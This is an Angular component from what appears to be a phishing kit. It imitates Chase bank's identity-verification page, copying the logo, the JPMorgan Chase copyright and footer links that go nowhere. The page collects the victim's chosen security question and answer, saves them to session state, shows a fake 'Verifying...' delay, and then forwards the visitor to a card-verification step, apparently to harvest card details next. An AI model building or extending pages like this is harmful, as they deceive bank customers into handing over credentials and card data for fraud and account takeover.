import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
  selector: 'app-chase-questions',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
      <div class="chase-flow-container">
      <main class="chase-main">
        <div class="chase-card">
           <svg class="chase-logo" viewBox="0 0 100 28" xmlns="http://www.w3.org/2000/svg">
              <path d="M15.545 0L10.224 0L20.448 18.667L15.127 18.667L25.352 37.333H30.672L20.448 18.667L25.769 18.667L15.545 0ZM55.224 0L50.082 0L60.306 18.667L54.985 18.667L65.209 37.333H70.53L60.306 18.667L65.626 18.667L55.224 0ZM35.333 0H0V9.333H35.333V0ZM35.333 14H0V23.333H35.333V14ZM35.333 28H0V37.333H35.333V28Z" style="fill: #0060a9;"/>
              <text x="30" y="27" font-family="Arial" font-weight="bold" font-size="22" style="fill: #0060a9;">CHASE</text>
           </svg>
          <div class="mb-6">
            <h1 class="mb-2">Identity verification</h1>
            <p class="text-sm text-slate-600">For your security, please answer one of your security questions to proceed.</p>
          </div>
          
          <form [formGroup]="questionsForm" (ngSubmit)="onSubmit()">
            <div class="chase-form-group">
              <label for="question">Security Question</label>
              <select 
                id="question" 
                formControlName="question"
                class="w-full h-11 px-3 border border-slate-300 rounded focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
              >
                <option value="" disabled>Select a question</option>
                <option *ngFor="let q of securityQuestions" [value]="q">{{q}}</option>
              </select>
            </div>

            <div class="chase-form-group">
              <label for="answer">Your Answer</label>
              <input 
                type="text" 
                id="answer" 
                formControlName="answer"
                placeholder="Answer"
                [class.error]="isFieldInvalid('answer')"
              >
            </div>

            <button 
              type="submit" 
              class="chase-btn-primary"
              [disabled]="questionsForm.invalid || isLoading()"
            >
              <span *ngIf="!isLoading()">Next</span>
              <span *ngIf="isLoading()">Verifying...</span>
            </button>
          </form>
        </div>

        <footer class="chase-footer">
          <div class="flex justify-center mb-4">
            <a href="javascript:void(0)">Contact us</a>
            <a href="javascript:void(0)">Privacy</a>
            <a href="javascript:void(0)">Security</a>
            <a href="javascript:void(0)">Terms of use</a>
          </div>
          <p>© 2024 JPMorgan Chase & Co.</p>
        </footer>
      </main>
    </div>
  `,
  styleUrls: ['../../../styles/flows/chase.scss']
})
export class ChaseQuestionsComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private stateService = inject(StateService);

  securityQuestions = [
    "What was the name of your first pet?",
    "In what city was your first full-time job?",
    "What is the middle name of your oldest child?",
    "What was your first car?",
    "What is your mother's maiden name?"
  ];

  questionsForm = this.fb.group({
    question: ['', Validators.required],
    answer: ['', [Validators.required, Validators.minLength(2)]]
  });

  isLoading = signal(false);

  isFieldInvalid(field: string): boolean {
    const control = this.questionsForm.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  onSubmit() {
    if (this.questionsForm.valid) {
      this.isLoading.set(true);

      const { question, answer } = this.questionsForm.value;

      this.stateService.updateSession({
        securityQuestion: question,
        securityAnswer: answer,
        currentStep: 'card-verification'
      });

      setTimeout(() => {
        this.isLoading.set(false);
        this.router.navigate(['/verify/chase/card']);
      }, 1500);
    }
  }
}
